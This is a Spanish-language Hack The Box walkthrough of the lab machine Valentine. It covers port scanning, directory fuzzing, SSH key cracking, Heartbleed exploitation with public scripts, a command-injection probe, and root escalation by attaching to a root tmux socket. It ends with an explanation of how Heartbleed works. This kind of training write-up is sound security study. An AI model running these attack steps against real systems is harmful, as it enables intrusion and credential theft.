---
layout: single
title: Valentine - Hack The Box
excerpt: "Tocamos directorio activo"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-inteligence/inteligence1.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - AD
  - Windows  
---

# 10.10.10.79 - Valentine

![](/assets/images/htb-valentine/valentine1.png)

--------------

## Part 1. Escaneo de puertos:

```console
└─$ nmap -sCV -T5 10.10.10.79 -Pn -v
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 80/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
22/tcp    open     ssh            OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp    open     http           Apache httpd 2.2.22 ((Ubuntu))
443/tcp   open     ssl/http       Apache httpd 2.2.22 ((Ubuntu))
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
|_http-server-header: Apache/2.2.22 (Ubuntu)
└─$ whatweb http://10.10.10.79
http://10.10.10.79 [200 OK] Apache[2.2.22], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
└─$ whatweb https://10.10.10.79
https://10.10.10.79 [200 OK] Apache[2.2.22], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
```
La peticion por el puerto 443 da error, pero el escaneo reporta que la web se llama Valentine.htb, asi que se añade al /etc/hosts la linea
```10.10.10.79	valentine.htb```

-----------------------
## Part 2: Analizando la web

La web tiene una foto:
![](/assets/images/htb-valentine/valentine2.PNG)

```console
└─$ curl http://valentine.htb/omg.jpg -O 
└─$ exiftool ./omg.jpg
```
Los metadatos no dicen nada interesante.
Disponemos a hacer fuzzing:
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ/
000000001:   200        1 L      2 W        38 Ch       "index"   # -> Lo mismo que la web en sí.                
000000820:   301        9 L      28 W       308 Ch      "dev"                 
000023098:   200        27 L     54 W       554 Ch      "encode"                                             
000024229:   200        25 L     54 W       552 Ch      "decode"                                             
000029887:   200        619 L    5759 W     145482 Ch   "omg"     # -> la foto
```
Si hago fuzzing por extension php me sale tambien /index /decode y /encode. El fuzzing por subdominios no da resultados.

**/dev** nos da directory listing, hay dos archivos notes.txt y hype.key
Hype.key es un archivo en hexadecimal (un monton de bytes)
```console
└─$ cat hype.key | xxd -ps -r
```
Encontramos una llave privada (supongo que para hacer ssh).
/encode y /decode nos codifica texto en base 64, o sea hace el comando ```echo "input" | base64 -w0```, es decir le pasa comandos al sistema. 
Pero la prueba ```test; whoami``` no funciona.

![](/assets/images/htb-valentine/valentine3.PNG)

La id_rsa le damos los permisos 
```console
└─$ chmod 600 ./id_rsa   
└─$ ssh -i id_rsa 10.10.10.79
Enter passphrase for key 'id_rsa': 
```
No tenemos la contraseña pero se pued intentar crackear la llave:
```console
└─$ python3 /usr/share/john/ssh2john.py id_rsa > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
```
-----------------------
## Part 3: Heartbleed

Pero no obtenemos contraseña, tiramos de nmap para que nos busque vulnerabilidades.
```console
└─$ nmap -T5 10.10.10.79 -script vuln  
| ssl-heartbleed: VULNERABLE:
The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
State: VULNERABLE Risk factor: High
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
```
Nos hablan de la vulnerabilidad HEARTBLEED 
```console
└─$ searchsploit -m multiple/remote/32764.py
└─$ python2 32764.py 10.10.10.79 -p443 | tee archivo.txt
```
Este exploit no me ha sacado nada interesante, pero he encontrado otro:
```https://github.com/mpgn/heartbleed-PoC```
```console
└─$ python2 heartbleed-exploit.py 10.10.10.79
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
└─$ cat out.txt | xxd -r
```
Nada interesante. Hay que ejecutarlo varias veces...
A la segunda vez nos leakea esto: ```$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=``` Como la cadena son letras, 
numeros y un "=" suponemos que es base64
```console
└─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=" | base64  -d
heartbleedbelievethehype
```
Parece la contraseña de ssh, el asunto es que ha sido un base64 porque supongo que el creador de la ma quinahabra utilizado su porpia herramienta 
/decode para "cifrar" la contraseña.
Como la llave era hype_key, podemos entrar con ese usuario:

-----------------------
## Part 4: Entrando en el sistema

```console
└─$ ssh -i id_rsa hype@10.10.10.79;
```
La enumeracion con mi script dice que:
- No hay SUIDS criticos ni capabilities.  
- Este archivo .conf tiene permiso de escritura: ```/home/hype/.config/Trolltech.conf```  
- Ha hecho varios comandos de TMUX (socketfiles) como ```tmux -S /.devs/dev_sess```  
- En la ruta /var/www esta el codigo php de la web (decode, encode y demas)  

```console
hype@Valentine:~$ ls -la /.devs/dev_sess
srw-rw---- 1 root hype 0 Oct 10 23:23 /.devs/dev_sess
hype@Valentine:~$ export TERM=xterm
hype@Valentine:~$ export SHELL=bash
hype@Valentine:~$ tmux -S /.devs/dev_sess
```
Como el socket_file es de root (archivo que guarda una session en la consola Tmux) se puede reanudar,
teniendo esa consola de root. 

--------------------------------------------

## Extra: Heartbleed

"Corazon sangrante" es una vulnerabilidad que afecta a "OpenSSl 1.0.1 a 1.0.1f"    
Los Cetificados SSL están creados para encriptar las conexiones del protocolo https (por lo que la data que se envia se hace ilegible (encriptada)).    
Paralelamente a esta conexion esta el HEARTBEAT, un reconocimiento que hace el cliente con el servidor para decirle que la conexion sigue abierta: 
le dice una palabra y le pide que se la repita (y como esto no es confidencial no se encripta)    

han llamado "Latido de corazon" porque son dos golpes (pregunta-respuesta)    
Heartbeat normal (latido):     
```
cliente: "SI ESTAS AHI MANDAME LA PALABRA 'PATATA', (6letras)".
servidor: "PATATA"
```
El problema con Heartbleed esque le podemos decir que la respuesta sea mas larga que lo esperado.    

```
cliente: "SI ESTAS AHI MANDAME LA PALABRA 'PATATA', (600letras)".
servidor: "PATATA, pero como me has pedido 600 letras te contare muchas cosas interesantes más"```
```
Aqui se leakea los datos de la conexion https pero sin encriptar (ya que estos se guardan en la memoria y le hemos hecho sangrar esta misma con 
la respuesta MAS LARGA DE LO NORMAL)  
Leyendo el exploit, nos dice que una peticion HEARTBEAT es tal que asi:  
```
HEADERS:
18 -> Numero que indica que esto es un paquete Heartbeat
03 02 -> version TLS
00 03 -> tamaño (no se de que, supongo que la peticion?)
01 -> peticion de que nos hagan un heartbeat
40 00 -> tamaño de la respuesta que queremos (en decimal, paquetes de 16 384 bytes) 
PAYLOAD: "hello" # -> la palabra que nos tiene que repetir
```